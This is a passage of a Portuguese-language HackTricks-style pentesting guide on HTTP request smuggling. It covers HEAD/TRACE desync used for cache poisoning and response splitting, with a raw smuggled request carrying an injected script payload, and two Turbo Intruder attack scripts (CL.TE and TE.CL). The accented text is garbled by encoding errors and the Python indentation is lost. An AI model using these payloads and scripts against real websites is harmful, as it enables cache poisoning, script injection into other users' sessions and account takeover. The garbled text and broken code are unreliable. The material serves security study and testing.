Um exemplo de como abusar desse comportamento seria **contrabandear primeiro uma solicita√ß√£o HEAD**. Esta solicita√ß√£o ser√° respondida apenas com os **cabe√ßalhos** de uma solicita√ß√£o GET (**`Content-Type`** entre eles). E contrabandear **imediatamente ap√≥s o HEAD uma solicita√ß√£o TRACE**, que estar√° **refletindo os dados enviados**.\
Como a resposta HEAD conter√° um cabe√ßalho `Content-Length`, a **resposta da solicita√ß√£o TRACE ser√° tratada como o corpo da resposta HEAD, refletindo assim dados arbitr√°rios** na resposta. \
Essa resposta ser√° enviada para a pr√≥xima solicita√ß√£o pela conex√£o, ent√£o isso poderia ser **usado em um arquivo JS em cache, por exemplo, para injetar c√≥digo JS arbitr√°rio**.

### Abusando do TRACE via Divis√£o de Resposta HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Continuar seguindo [**este post**](https://portswigger.net/research/trace-desync-attack) √© sugerido outro modo de abusar do m√©todo TRACE. Como comentado, contrabandear uma solicita√ß√£o HEAD e uma solicita√ß√£o TRACE √© poss√≠vel **controlar alguns dados refletidos** na resposta √† solicita√ß√£o HEAD. O comprimento do corpo da solicita√ß√£o HEAD √© basicamente indicado no cabe√ßalho Content-Length e √© formado pela resposta √† solicita√ß√£o TRACE.

Portanto, a nova ideia seria que, sabendo esse Content-Length e os dados fornecidos na resposta TRACE, √© poss√≠vel fazer com que a resposta TRACE contenha uma resposta HTTP v√°lida ap√≥s o √∫ltimo byte do Content-Length, permitindo que um atacante controle completamente a solicita√ß√£o para a pr√≥xima resposta (que poderia ser usada para realizar um envenenamento de cache).

Exemplo:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Ir√° gerar essas respostas (observe como a resposta HEAD tem um Content-Length fazendo com que a resposta TRACE fa√ßa parte do corpo do HEAD e uma vez que o Content-Length do HEAD termina, uma resposta HTTP v√°lida √© contrabandeada):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(‚Äúarbitrary response‚Äù)</script>
```
### Armar HTTP Request Smuggling com Desincroniza√ß√£o de Resposta HTTP

Voc√™ encontrou alguma vulnerabilidade de HTTP Request Smuggling e n√£o sabe como explor√°-la. Experimente este outro m√©todo de explora√ß√£o:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### Outras T√©cnicas de HTTP Request Smuggling

* HTTP Request Smuggling no Navegador (Lado do Cliente)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* Request Smuggling em Downgrades HTTP/2

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Scripts do Turbo Intruder

### CL.TE

De [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Ferramentas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta ferramenta √© um Fuzzer HTTP baseado em gram√°tica √∫til para encontrar discrep√¢ncias estranhas de smuggling de requisi√ß√£o.

## Refer√™ncias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
